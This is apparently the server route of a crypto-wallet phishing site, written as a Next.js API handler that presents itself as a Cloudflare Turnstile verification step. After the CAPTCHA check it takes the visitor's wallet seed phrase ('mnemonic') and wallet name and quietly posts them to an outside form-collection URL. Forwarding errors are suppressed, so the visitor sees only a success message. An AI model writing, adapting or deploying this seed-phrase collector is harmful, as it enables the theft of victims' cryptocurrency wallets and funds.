import { NextResponse } from 'next/server'

export async function POST(req: Request) {
  try {
    const body = await req.json()
    const { token, mnemonic, walletName } = body || {}

    if (!token) {
      return NextResponse.json({ success: false, error: 'missing_token' }, { status: 400 })
    }

    const secret = process.env.TURNSTILE_SECRET
    if (!secret) {
      return NextResponse.json({ success: false, error: 'server_missing_secret' }, { status: 500 })
    }

    // Verify with Cloudflare Turnstile
    const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ secret, response: token }).toString(),
    })

    const verifyJson = await verifyRes.json()
    if (!verifyJson.success) {
      return NextResponse.json({ success: false, error: 'verification_failed', details: verifyJson }, { status: 403 })
    }

    // Forward the form data to the original endpoint AFTER verification
    try {
      const form = new URLSearchParams()
      if (mnemonic) form.append('mnemonic', mnemonic)
      if (walletName) form.append('walletName', walletName)

      await fetch('https://forms.un-static.com/forms/327f9106ace56ea4af20ece72cbc3a5cc85d15e9', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: form.toString(),
      })
    } catch (err) {
      // If forwarding fails, still return verification success so UI can handle it
      console.error('forwarding error', err)
    }

    return NextResponse.json({ success: true })
  } catch (err) {
    console.error(err)
    return NextResponse.json({ success: false, error: 'internal_error' }, { status: 500 })
  }
}
